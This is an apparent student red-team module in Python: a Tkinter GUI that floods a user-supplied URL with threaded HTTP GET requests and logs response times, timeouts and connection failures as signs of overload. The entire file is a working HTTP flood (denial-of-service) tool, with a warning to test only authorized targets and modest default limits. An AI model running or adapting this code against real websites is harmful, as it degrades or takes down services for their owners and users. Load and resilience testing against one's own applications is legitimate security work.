"""
modules/http_flood.py
Module pour HTTP Flood / DDoS testing (OWASP A04:2025)

Red Team Context: Teste la résilience d'une application web face à des requêtes massives.
Démontre l'impact d'un déni de service applicatif.

Auteur : Étudiant en cybersécurité
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import requests
import time
from typing import Dict, List
from urllib.parse import urlparse


class HTTPFloodModule(tk.Frame):
    """Module GUI pour le test HTTP Flood"""

    def __init__(self, parent):
        super().__init__(parent, bg="#1e1e1e")
        self.pack(fill="both", expand=True)

        self.attack_thread = None
        self.is_attacking = False
        self.stats = {
            'sent': 0,
            'success': 0,
            'failed': 0,
            'total_time': 0.0
        }

        # Configuration
        config_frame = tk.Frame(self, bg="#1e1e1e")
        config_frame.pack(fill="x", pady=5)

        # URL Target
        ttk.Label(config_frame, text="Target URL:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.url_entry = ttk.Entry(config_frame, width=50)
        self.url_entry.insert(0, "http://localhost:3000/")
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        config_frame.columnconfigure(1, weight=1)

        # Options
        options_frame = tk.Frame(self, bg="#1e1e1e")
        options_frame.pack(fill="x", pady=5)

        ttk.Label(options_frame, text="Threads:").pack(side="left", padx=5)
        self.threads_var = tk.StringVar(value="5")
        threads_spinbox = ttk.Spinbox(options_frame, from_=1, to=20, width=10,
                                      textvariable=self.threads_var)
        threads_spinbox.pack(side="left", padx=5)

        ttk.Label(options_frame, text="Requests per thread:").pack(side="left", padx=10)
        self.requests_var = tk.StringVar(value="50")
        requests_spinbox = ttk.Spinbox(options_frame, from_=10, to=500, width=10,
                                       textvariable=self.requests_var)
        requests_spinbox.pack(side="left", padx=5)

        ttk.Label(options_frame, text="Delay (ms):").pack(side="left", padx=10)
        self.delay_var = tk.StringVar(value="10")
        delay_spinbox = ttk.Spinbox(options_frame, from_=0, to=1000, width=10,
                                    textvariable=self.delay_var)
        delay_spinbox.pack(side="left", padx=5)

        # Warning label
        warning_frame = tk.Frame(self, bg="#1e1e1e")
        warning_frame.pack(fill="x", pady=5)
        warning_label = ttk.Label(warning_frame, 
                                  text="⚠️ Test only on authorized targets!",
                                  foreground="#ff6b6b")
        warning_label.pack(side="left", padx=5)

        # Boutons
        button_frame = tk.Frame(self, bg="#1e1e1e")
        button_frame.pack(fill="x", pady=5)

        self.start_btn = ttk.Button(button_frame, text="Start Attack",
                                     command=self.start_attack)
        self.start_btn.pack(side="left", padx=5)

        self.stop_btn = ttk.Button(button_frame, text="Stop Attack",
                                    command=self.stop_attack, state="disabled")
        self.stop_btn.pack(side="left", padx=5)

        ttk.Button(button_frame, text="Clear Results",
                   command=self.clear_output).pack(side="left", padx=5)

        # Stats frame
        stats_frame = tk.Frame(self, bg="#252526")
        stats_frame.pack(fill="x", pady=5, padx=5)

        self.stats_label = ttk.Label(stats_frame, 
                                     text="Sent: 0 | Success: 0 | Failed: 0 | Avg Time: 0ms",
                                     foreground="#4dabf7")
        self.stats_label.pack(side="left", padx=10, pady=5)

        # Zone de résultats
        results_label = ttk.Label(self, text="Attack Log:")
        results_label.pack(anchor="w", pady=(10, 0))

        self.output = scrolledtext.ScrolledText(
            self, bg="#252526", fg="white", height=20, wrap=tk.WORD, font=("Courier", 9)
        )
        self.output.pack(fill="both", expand=True, pady=5)

        # Configuration des tags pour coloration
        self.output.tag_config("error", foreground="#ff6b6b")
        self.output.tag_config("success", foreground="#51cf66")
        self.output.tag_config("info", foreground="#4dabf7")
        self.output.tag_config("warning", foreground="#ffd43b")

    def log(self, msg: str, tag: str = None) -> None:
        """Log un message dans l'interface"""
        def _log():
            self.output.insert("end", msg + "\n", tag)
            self.output.see("end")
        
        if threading.current_thread() != threading.main_thread():
            self.after(0, _log)
        else:
            _log()

    def update_stats(self) -> None:
        """Met à jour l'affichage des statistiques"""
        avg_time = (self.stats['total_time'] / self.stats['sent'] * 1000) if self.stats['sent'] > 0 else 0
        text = (f"Sent: {self.stats['sent']} | Success: {self.stats['success']} | "
                f"Failed: {self.stats['failed']} | Avg Time: {avg_time:.0f}ms")
        self.stats_label.config(text=text)

    def clear_output(self) -> None:
        """Efface les résultats"""
        self.output.delete(1.0, "end")
        self.stats = {'sent': 0, 'success': 0, 'failed': 0, 'total_time': 0.0}
        self.update_stats()

    def start_attack(self) -> None:
        """Démarre l'attaque HTTP flood"""
        url = self.url_entry.get().strip()
        
        if not url:
            self.log("[!] Please enter a target URL", "error")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            self.url_entry.delete(0, "end")
            self.url_entry.insert(0, url)
        
        try:
            num_threads = int(self.threads_var.get())
            num_requests = int(self.requests_var.get())
            delay = int(self.delay_var.get()) / 1000.0
        except ValueError:
            self.log("[!] Invalid parameters", "error")
            return

        self.is_attacking = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        
        self.clear_output()
        self.log(f"[*] Starting HTTP Flood attack on {url}", "info")
        self.log(f"[*] Threads: {num_threads} | Requests/thread: {num_requests} | Delay: {delay*1000}ms", "info")
        self.log(f"[*] Total requests to send: {num_threads * num_requests}\n", "warning")

        # Lancer l'attaque dans des threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._attack_worker,
                args=(url, num_requests, delay, i+1),
                daemon=True
            )
            thread.start()

    def stop_attack(self) -> None:
        """Arrête l'attaque"""
        self.is_attacking = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log("\n[!] Attack stopped by user", "warning")

    def _attack_worker(self, url: str, num_requests: int, delay: float, thread_id: int) -> None:
        """Worker thread qui envoie les requêtes HTTP"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': f'FloodTest-Thread-{thread_id}'
        })

        self.log(f"[Thread-{thread_id}] Started", "info")

        for i in range(num_requests):
            if not self.is_attacking:
                break

            try:
                start_time = time.time()
                response = session.get(url, timeout=5)
                elapsed = time.time() - start_time

                self.stats['sent'] += 1
                self.stats['total_time'] += elapsed

                if response.status_code == 200:
                    self.stats['success'] += 1
                    if self.stats['sent'] % 10 == 0:  # Log every 10 requests
                        self.log(f"[Thread-{thread_id}] Request {i+1}/{num_requests} - "
                                f"Status: {response.status_code} ({elapsed*1000:.0f}ms)", "success")
                else:
                    self.stats['failed'] += 1
                    self.log(f"[Thread-{thread_id}] Request {i+1}/{num_requests} - "
                            f"Status: {response.status_code}", "warning")

                self.after(0, self.update_stats)

            except requests.exceptions.Timeout:
                self.stats['sent'] += 1
                self.stats['failed'] += 1
                self.log(f"[Thread-{thread_id}] Timeout - Server may be overloaded!", "error")
                self.after(0, self.update_stats)

            except requests.exceptions.ConnectionError:
                self.stats['sent'] += 1
                self.stats['failed'] += 1
                self.log(f"[Thread-{thread_id}] Connection Error - Server may be down!", "error")
                self.after(0, self.update_stats)

            except Exception as e:
                self.stats['sent'] += 1
                self.stats['failed'] += 1
                self.log(f"[Thread-{thread_id}] Error: {str(e)}", "error")
                self.after(0, self.update_stats)

            time.sleep(delay)

        self.log(f"[Thread-{thread_id}] Finished", "info")

        # Si tous les threads sont terminés, réactiver le bouton
        if self.stats['sent'] >= int(self.threads_var.get()) * int(self.requests_var.get()):
            self.after(0, lambda: self.start_btn.config(state="normal"))
            self.after(0, lambda: self.stop_btn.config(state="disabled"))
            self.is_attacking = False
            self.log("\n[+] Attack completed!", "success")
            self.log(f"[+] Final stats - Sent: {self.stats['sent']}, "
                    f"Success: {self.stats['success']}, Failed: {self.stats['failed']}", "info")


if __name__ == "__main__":
    root = tk.Tk()
    root.title("HTTP Flood Test")
    root.geometry("900x600")
    HTTPFloodModule(root)
    root.mainloop()
